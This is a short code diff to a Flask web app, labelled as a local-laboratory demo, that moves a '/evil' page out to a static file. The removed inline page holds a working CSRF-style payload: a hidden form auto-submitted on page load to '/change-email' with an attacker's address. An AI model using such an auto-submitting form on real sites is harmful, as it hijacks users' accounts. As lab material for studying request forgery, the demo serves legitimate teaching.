@@ -94,25 +94,7 @@ def logout():
 # ---- Demo same-origin "maliciosa" (solo para laboratorio local) ----
 @app.route("/evil", methods=["GET"])
 def evil_page():
-    return '''
-    <!doctype html>
-    <html>
-    <head><meta charset="utf-8"><title>evil same-origin demo</title></head>
-    <body>
-      <h3>evil (same-origin demo)</h3>
-      <p>Esta página se sirve desde el mismo host/puerto que la app legítima.</p>
-      <form id="f" action="/change-email" method="POST">
-        <input name="new_email" value="evil@attacker.com">
-      </form>
-      <script>
-        document.addEventListener('DOMContentLoaded', function() {
-          var form = document.getElementById('f');
-          if (form) form.submit();
-        });
-      </script>
-    </body>
-    </html>
-    '''
+    return send_from_directory('static','evil.html')
 
 if __name__ == "__main__":
     init_db()
